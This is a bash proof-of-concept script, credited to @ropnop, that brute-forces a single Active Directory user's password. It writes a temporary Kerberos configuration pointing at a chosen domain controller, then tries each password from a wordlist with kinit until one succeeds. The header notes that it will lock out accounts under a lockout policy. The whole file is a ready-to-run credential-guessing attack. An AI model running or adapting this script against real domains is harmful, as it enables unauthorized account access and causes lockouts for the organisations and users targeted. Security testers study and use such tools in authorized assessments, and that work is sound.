#!/bin/bash

# Title: kinit_brute.sh
# Author: @ropnop
# Description: This is a PoC for bruteforcing passwords using 'kinit' to try to check out a TGT from a Domain Controller
# The script configures the realm and KDC for you based on the domain provided and the domain controller
# Since this configuration is only temporary though, if you want to actually *use* the TGT you should actually edit /etc/krb5.conf
# Only tested with Heimdal kerberos (error messages might be different for MIT clients)
# Note: this *will* lock out accounts if a domain lockout policy is set. Be careful


USERNAME=$1
DOMAINCONTROLLER=$2
WORDLIST=$3

if [[ $# -ne 3 ]]; then
	echo "[!] Usage: ./kinit_brute.sh full_username domainController wordlist_file"
	echo "[!] Example: ./kinit_brute.sh ropnop@contoso.com dc01.contoso.com passwords.txt"
	exit 1
fi

DOMAIN=$(echo $USERNAME | awk -F@ '{print toupper($2)}')

echo "[+] User: $USERNAME"
echo "[+] Kerberos Realm: $DOMAIN"
echo "[+] KDC: $DOMAINCONTROLLER"
echo ""

k5config=$(mktemp)
k5cache=$(mktemp)

cat > $k5config <<asdfasdf
[libdefaults]
	default_realm = $DOMAIN
[realms]
	$DOMAIN = {
		kdc = $DOMAINCONTROLLER
		admin_server = $DOMAINCONTROLLER
	}
asdfasdf

while read PASSWORD; do
	RESULT=$(
	echo $PASSWORD | KRB5_CONFIG=$k5config KRB5CCNAME=$k5cache kinit --password-file=STDIN $USERNAME 2>&1
	)
	if [[ $RESULT == *"unable to reach"* ]]; then
		echo "[!] Unable to find KDC for realm. Check domain and DC"
		exit 1
	fi
	if [[ $RESULT == *"Wrong realm"* ]]; then
	       echo "[!] Wrong realm. Make sure domain and DC are correct"
     	       exit 1
        fi
	if [[ $RESULT == *"Clients credentials have been revoked"* ]]; then
		echo "[!] Account locked out!"
		exit 1
	fi
	if [[ $RESULT == *"Password incorrect"* ]]; then
		:
	elif [[ -z "$RESULT" ]]; then
		echo "[+] Found password: $PASSWORD"
		echo ""
		exit 1
	else
		echo "[+] Error: $RESULT"
	fi
done <$WORDLIST
